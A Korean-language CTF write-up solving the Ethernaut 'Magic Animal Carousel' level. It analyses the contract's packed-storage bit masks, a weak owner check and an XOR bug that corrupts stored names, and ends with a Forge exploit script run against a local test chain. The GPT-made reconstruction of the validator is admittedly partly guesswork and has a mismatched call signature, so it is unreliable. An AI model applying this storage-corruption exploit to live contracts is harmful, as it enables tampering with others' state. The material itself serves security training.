# 지문

안녕하세요, 익명님. 마법의 회전목마에 오신 것을 환영합니다. 이곳에서는 생물들이 무한한 마법으로 빙글빙글 돌아갑니다. 이 마법적이고 무한한 디지털 회전목마 안에서 생물들은 매혹적인 열정으로 빙글빙글 돌아갑니다.

동물을 추가해서 재미를 더하세요. 하지만 규칙을 잘 지켜야 합니다. 그렇지 않으면 게임이 끝나는 거예요. 동물이 놀이기구에 합류하면, 다시 확인할 때 조심하세요. 같은 동물이 있을 거예요!

회전목마의 마법의 규칙을 깰 수 있나요?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    error AnimalNameTooLong();

    constructor() {
        carousel[0] ^= 1 << 160;
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        address owner = address(uint160(carousel[crateId] & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // Replace animal
            carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
        } else {
            // If no animal specified keep same animal but clear owner slot
            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

# 풀이 

전반적으로 하나의 uint256 type의 storage slot에 여러개의 값을 저장함. (동물 이름, 다음 crate ID, owner 주소)


일단 bit 연산과 관련된 부분은 직관적으로 보기 힘드니 직관적이지않은 부분부터 정리하고 시작함 

```solidity
    uint16 constant public MAX_CAPACITY = type(uint16).max;                 // 0x000000000000000000000000000000000000000000000000000000000000ffff
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;   // 0xffffffffffffffffffff00000000000000000000000000000000000000000000
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;       // 0x00000000000000000000ffff0000000000000000000000000000000000000000
    uint256 constant OWNER_MASK = uint256(type(uint160).max);               // 0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff

    constructor() {
        carousel[0] ^= 1 << 160; // 0x10000000000000000000000000000000000000000
    }
```

- `currentCrateId`
  - 지금 동물이 들어있는 칸 번호.

- `carousel[crateId]`
  - 하나의 256비트 안에 3가지 정보 저장 ([ 80비트(10바이트) 동물 이름 ][ 16비트(2바이트) 다음칸 ID ][ 160비트(20바이트) 소유자 주소 ])

- `setAnimalAndSpin`
  - 현재 칸(`currentCrateId`)이 가리키는 `nextCrateId`를 가져옴.
  - 새로운 동물 이름을 encode해서 176비트 이후 구간(=동물 자리)에 저장.
  - 이 저장하는 코드에 문제가 존재함 
  - ```solidity
        carousel[nextCrateId] =
          (carousel[nextCrateId] & ~NEXT_ID_MASK)             // 기존 nextId 지우기
        ^ (encodedAnimal << (160+16))                        // 동물 정보 새로 기록 
        | ((nextCrateId + 1) % MAX_CAPACITY) << 160          // 다음 칸 id 갱신
        | uint160(msg.sender);                               // 소유자 기록
    ```

- `encodeAnimalName`
  - `animalName`의 Length가 12아래여야함. (12바이트)
  - `animalName` (최대 12바이트) + "00" padding(최소 8바이트)
  - 도합 20바이트를 제외하고 뒤에 12바이트를 없앰


- `changeAnimal`
  - 지정한 `crateId`에 대응되는 `carousel`의 owner가 0이면 owner 검증을 하지않음.
  - `encodeAnimalName` 함수를 호출해서 값이 유효하면 해당 crateId에 동물의 이름을 새로 설정함 
  - 유효하지 않으면 `carousel`에 동물이름과 crate id만 남겨놓고 owner만 삭제함.

일단 여기까지 분석은 했는데 이상한건 `changeAnimal` 함수에 owner check가 미흡해서 `setAnimalAndSpin` 함수로 설정하지않은 `carousel`까지 수정할 수 있음.

그래서 어떻게 정답을 검증하는지 잘못된 submission을 제출한다음에 Transaction을 분석해봤음.

```shell
hojunghan@hojungui-MacBookPro ethernaut-solve-using-foundry % cast run 0x2424ed5c4bd273f6884f50d8ef8cb95838b560f0d1ccf18e2e465060c7969cce --rpc-url http://localhost:8545
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

Executing previous transactions from the block.
Traces:
  [160245] 0x5FbDB2315678afecb367f032d93F642f64180aa3::submitLevelInstance(0x524F04724632eED237cbA3c37272e018b3A7967e)
    ├─ [53087] 0x0B306BF915C4d645ff596e518fAf3F9669b97016::validateInstance(0x524F04724632eED237cbA3c37272e018b3A7967e, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)
    │   ├─ [47528] 0x524F04724632eED237cbA3c37272e018b3A7967e::setAnimalAndSpin("Goat")
    │   │   └─ ← [Stop]
    │   ├─ [283] 0x524F04724632eED237cbA3c37272e018b3A7967e::currentCrateId() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [446] 0x524F04724632eED237cbA3c37272e018b3A7967e::carousel(1) [staticcall]
    │   │   └─ ← [Return] 0x476f617400000000000000020b306bf915c4d645ff596e518faf3f9669b97016
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [94280] 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9::submitFailure(0x524F04724632eED237cbA3c37272e018b3A7967e, 0x0B306BF915C4d645ff596e518fAf3F9669b97016, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)
    │   ├─ [87010] 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512::submitFailure(0x524F04724632eED237cbA3c37272e018b3A7967e, 0x0B306BF915C4d645ff596e518fAf3F9669b97016, 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC) [delegatecall]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    └─ ← [Stop]

```

```solidity
// 0x0B306BF915C4d645ff596e518fAf3F9669b97016 디컴파일 결과 
function 0xd38def5b(address varg0, address varg1) public nonPayable {  //validateInstance
    require(msg.data.length - 4 >= 64);
    v0 = new bytes[](v1.length);
    v2 = v3 = 0;
    while (v2 < v1.length) {
        v0[v2] = v1[v2];
        v2 += 32;
    }
    v0[v1.length] = 0;
    require(bool(varg0.code.size));
    v4 = varg0.call(0xab3b922400000000000000000000000000000000000000000000000000000000, v0, v5, 0x476f617400000000000000000000000000000000000000000000000000000000).gas(msg.gas); // setAnimalAndSpin
    require(bool(v4), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    v6, /* uint256 */ v7 = varg0.staticcall(uint32(0x26bad99e)).gas(msg.gas); // currentCrateId()
    require(bool(v6), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v8, /* uint256 */ v9 = varg0.staticcall(uint32(0x93684bd4), v7).gas(msg.gas); // carousel()
    require(bool(v8), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
    v10 = v11 = 0;
    while (v10 < v1.length) {
        MEM[v10 + (32 + MEM[64])] = v1[v10];
        v10 += 32;
    }
    if (4 < 32) {
        v12 = v13 = bytes4(v14);
    }
    return bool(v12 >> 176 != v9 >> 176);
}
```

decompile 중간에 소실된 context가 있지만 이걸 gpt한테 직관적인 코드로 바꿔달라고 요청했다.
```solidity
function validateInstance(address targetContract, address /* unused */) 
        external 
        returns (bool) 
    {
        // targetContract가 유효한 컨트랙트인지 확인
        require(targetContract.code.length > 0, "Target is not a contract");
        
        ITarget target = ITarget(targetContract);
        
        // 1. "Goat"으로 동물 설정 및 스핀 실행
        bytes memory emptyData = new bytes(0);
        bytes32 goat = "Goat";
        target.setAnimalAndSpin(emptyData, goat);
        
        // 2. 현재 크레이트 ID 가져오기
        uint256 currentCrate = target.currentCrateId();
        
        // 3. 캐러셀에서 해당 크레이트의 값 가져오기
        uint256 carouselValue = target.carousel(currentCrate);
        
        // 4. 상위 10바이트(80비트) 비교
        // 원래 코드: v12 >> 176 != v9 >> 176
        // 256 - 176 = 80비트, 즉 상위 10바이트를 비교
        bytes32 someValue = goat; // 실제로는 v12가 무엇인지 더 분석이 필요
        
        return (uint256(someValue) >> 176) != (carouselValue >> 176);
    }
```

그래서 나온 코드인데 goat로 동물이름을 저장했는데 실제로 goat로 저장되지않는것이 풀이 조건임이 명확해졌다.

위에서 언급한 이상한점과 `setAnimalAndSpin`함수에서 값을 저장할 때 비트연산을 생각해보면 처음에 carousel에서 nextid에 해당되는 부분만 지우고 나머지와 animal name을 xor하는데 그부분때문에 사용자가 저장하는 동물이름이 똑바로 저장되지않는다

그것을 이용해서 풀면된다.
비트연산이 좀 있어서 복잡해보이긴한데 풀이 코드 자체는 심플한편임

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function encodeAnimalName(string calldata animalName) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
    function carousel(uint256 crateId) external view returns (uint256);
}

contract SolveScript is Script {
    address public target = 0x524F04724632eED237cbA3c37272e018b3A7967e;
    uint16 public MAX_CAPACITY = type(uint16).max;                 // 0x000000000000000000000000000000000000000000000000000000000000ffff
    uint256 ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;   // 0xffffffffffffffffffff00000000000000000000000000000000000000000000
    uint256 NEXT_ID_MASK = uint256(type(uint16).max) << 160;       // 0x00000000000000000000ffff0000000000000000000000000000000000000000
    uint256 OWNER_MASK = uint256(type(uint160).max);               // 0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff


    function setUp() public {}

    // forge script -vv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();

        ITarget t = ITarget(target);

        uint256 curr = t.currentCrateId();
        uint256 slot = t.carousel(curr);
        uint256 nextCrateId = (slot & NEXT_ID_MASK) >> 160;

        console.log("currentCrateId :", curr);
        console.log("nextCrateId    :", nextCrateId);

        t.changeAnimal("ZZZ", nextCrateId);

        slot = t.carousel(nextCrateId);
        console.log("Slot 1 state after change:", slot);

        vm.stopBroadcast();
    }
}
```